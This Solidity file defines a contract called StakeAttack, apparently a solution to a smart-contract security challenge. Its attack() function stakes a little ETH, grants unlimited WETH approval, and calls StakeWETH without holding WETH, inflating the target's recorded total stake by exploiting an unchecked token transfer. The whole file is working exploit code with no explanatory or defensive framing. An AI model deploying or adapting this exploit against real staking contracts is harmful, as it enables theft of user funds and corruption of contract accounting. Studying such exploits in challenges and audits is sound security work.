// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IWETH {
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IStake {
    function StakeETH() external payable;
    function StakeWETH(uint256 amount) external;
    function Unstake(uint256 amount) external;
}

contract StakeAttack {
    address public owner;
    IWETH public wethInstance;
    IStake public stakeInstance;
    uint256 private constant STAKE_AMOUNT = 0.001 ether + 1 wei;

    constructor(address _stakeInstance, address _wethInstance) {
        owner = msg.sender;
        wethInstance = IWETH(_wethInstance);
        stakeInstance = IStake(_stakeInstance);
    }

    function attack() external payable {
        require(msg.sender == owner, "Only owner can perform the attack");

        // Stake some ETH (0.001 ETH + 1 wei)
        stakeInstance.StakeETH{value: msg.value}();

        // Set approval for the stakeInstance to spend WETH on behalf of this contract
        wethInstance.approve(address(stakeInstance), type(uint256).max);

        // Call StakeWETH to increase totalStaked without affecting the smart contract's ETH balance.
        stakeInstance.StakeWETH(STAKE_AMOUNT);
    }
}
